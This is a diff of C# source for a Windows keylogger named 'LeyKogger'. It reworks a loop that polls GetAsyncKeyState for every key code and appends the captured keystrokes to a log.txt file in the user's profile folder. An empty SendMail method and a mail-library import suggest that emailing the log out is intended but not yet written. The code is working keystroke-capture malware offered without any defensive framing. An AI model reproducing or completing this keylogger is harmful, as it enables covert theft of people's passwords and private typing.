@@ -7,14 +7,14 @@ using System.Net.Mail;
 using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Collections.Generic;
 
 namespace LeyKogger
 {
     static class Program
     {
         private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
-        private static bool[] keyboardState = new bool[256];
-        private static char[] keys = new char[265];
+        private static List<Keys> keys = new List<Keys>();
 
         private static void Initiate()
         {
@@ -24,33 +24,41 @@ namespace LeyKogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        private static char[] ReadKeyboard(char[] keys)
+        private static void ReadKeyboard()
         {
-            for (int x = 0; x < 256; x++)
-                keys[x] = (char)(GetAsyncKeyState(x) >> 8);
-            return keys;
+            for (short x = 0; x < 256; x++)
+                if (GetAsyncKeyState(x) != 0 && (Keys)x != Keys.None)
+                    keys.Add((Keys)x);
         }
 
         static void Main()
         {
             string buffer = "";
-            int state = 0;
-            int nextState = 0;
+            int state;
 
             while (true)
             {
-                keys = ReadKeyboard(keys);
-                foreach (char c in keys)
-                    if (c != 0)
-                        buffer += c;
+                ReadKeyboard();
+                foreach (Keys key in keys)
+                {
+                    if (key == Keys.Space) { buffer += " "; continue; }
+                    if (key == Keys.LButton && key == Keys.RButton && key == Keys.MButton) { continue; }
+
+                    buffer += key.ToString();
+                }
                 File.AppendAllText(path, buffer);
                 buffer = "";
+                keys.Clear();
+                Thread.Sleep(100);
+            }
 
-                /*Thread.Sleep(75);
+            /*while (true)
+            {
+                Thread.Sleep(75);
                 for (short i = 0; i < 256; i++)
                 {
                     state = GetAsyncKeyState(i);                    
-                    if (state != 0 && state != nextState)
+                    if (state != 0)
                     {
                         buffer += ((Keys)i).ToString();
                         //buffer += (char)(state >> 8);
@@ -62,22 +70,13 @@ namespace LeyKogger
                         //nextState = state;
                         state = 0;
                     }   
-                }*/
-            }
+                }
+            }*/
         }
 
         private static void SendMail()
         {
 
         }
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("user32.dll")]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetModuleHandle(String lpModuleName);
     }
 }
